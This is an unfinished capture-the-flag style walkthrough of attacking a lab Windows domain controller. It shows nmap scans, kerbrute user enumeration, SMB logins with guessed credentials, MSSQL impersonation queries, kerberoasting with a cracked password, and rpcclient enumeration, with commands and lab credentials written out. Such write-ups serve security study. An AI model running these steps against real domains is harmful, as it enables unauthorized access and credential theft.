#WIP #Kerberoast 
```IP
192.168.163.40
```
# Enumeration
## Nmap
As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 192.168.163.40 -vvv -p- -oN enum/full
```
The output being:

```
PORT      STATE    SERVICE       REASON          VERSION
53/tcp    open     domain        syn-ack ttl 125 Simple DNS Plus  
80/tcp    open     http          syn-ack ttl 125 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open     kerberos-sec  syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2024-11-04 08:52:07Z)      
135/tcp   open     msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open     netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
389/tcp   open     ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds? syn-ack ttl 125
464/tcp   open     kpasswd5?     syn-ack ttl 125
593/tcp   open     ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap      syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
1433/tcp  open     ms-sql-s      syn-ack ttl 125 Microsoft SQL Server 2019 15.00.2000.00; RTM 
1433/tcp  open     ms-sql-s      syn-ack ttl 125 Microsoft SQL Server 2019 15.00.2000.00; RTM 
3268/tcp  open     ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
3269/tcp  open     ssl/ldap      syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
3389/tcp  open     ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
5985/tcp  open     http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8530/tcp  open     http          syn-ack ttl 125 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: 403 - Forbidden: Access is denied.
|_http-server-header: Microsoft-IIS/10.0
8531/tcp  open     unknown       syn-ack ttl 125
9389/tcp  open     mc-nmf        syn-ack ttl 125 .NET Message Framing
10916/tcp filtered unknown       no-response
14204/tcp filtered unknown       no-response
23471/tcp filtered unknown       no-response
28033/tcp filtered unknown       no-response
28854/tcp filtered unknown       no-response
33240/tcp filtered unknown       no-response
47001/tcp open     http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open     msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open     msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open     msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open     msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open     msrpc         syn-ack ttl 125 Microsoft Windows RPC
49670/tcp open     msrpc         syn-ack ttl 125 Microsoft Windows RPC
49675/tcp open     msrpc         syn-ack ttl 125 Microsoft Windows RPC
49684/tcp open     ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
49685/tcp open     msrpc         syn-ack ttl 125 Microsoft Windows RPC
49693/tcp open     msrpc         syn-ack ttl 125 Microsoft Windows RPC
49700/tcp open     msrpc         syn-ack ttl 125 Microsoft Windows RPC
49701/tcp open     msrpc         syn-ack ttl 125 Microsoft Windows RPC
49712/tcp open     msrpc         syn-ack ttl 125 Microsoft Windows RPC
58538/tcp open     ms-sql-s      syn-ack ttl 125 Microsoft SQL Server 2019 15.00.2000.00; RTM
```
## SMB
We start by enumerating smb shares, in which we find nothing except domain name `dhokkaido-aerospace.com` that we can add to `/etc/hosts`.
The complete computername would be dc.hokkaido-aerospace.com.
## Kerberos
If we perform a kerberos brute force attack on the target we can retrieve a list of users:
```
./kerbrute userenum --dc 192.168.242.40 -d hokkaido-aerospace.com /usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241104103122.png?raw=true)

Back to SMB, we can add to our password list the users found, and with `info:info` credentials we can retrieve some interesting shares:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241104110745.png?raw=true)

We will now access homes share with smbclient tool as shown below:
```
smbclient //192.168.242.40/homes -U 'hokkaido-aerospace.com\info' --password='info'
```

Here we will find a list of names that we will inmediately add to our user list. In WsusContent share we can find the following file:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241104111814.png?raw=true)

Which turns up to be empty. However in NETLOGON share we will find a password:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241104114558.png?raw=true)

After adding it to our password list, we get a new hit:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241104114656.png?raw=true)

## MSSQL
Moving on to MSSQL service we can assess the installed version: Microsoft SQL Server 2019 RTM 10.0.20348
As shown below, with `info:info` credentials and impacket-mssqlclient tool we can log in:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241104113236.png?raw=true)

However, this approach results fruitless since we cannot impersonate other users or retrieve any interesting information. nonetheless, logging in with user credentials `discover:Start123!` we can impersonate and get another password:

```
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
```

```
select name,create_date,modify_date,type_desc as type,authentication_type_desc as authentication_type,sid from sys.database_principals where type not in ('A', 'R') order by name;
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241104121522.png?raw=true)

```
Untimed$Runny
```

Back to kerberos, we can now perform a kerberoast attack now that we have some credentials:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241104124749.png?raw=true)

As shown in the image above, we get some hashes that we can crack, which will result in the following password: `haze1988`.
## RPC
now we can access
```
rpcclient -U 'hokkaido-aerospace.com\Hazel.Green' --password='haze1988' 192.168.242.40
```
Angela.Davies is domainadmin
Alexandra.Little, Molly.Smith and Hazel.Green are IT members
Molly.Smith is Tear 1 admin
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241105130648.png?raw=true)

WIP
# PrivEsc

## Manual

## Automated

### Peass
### Mimikatz


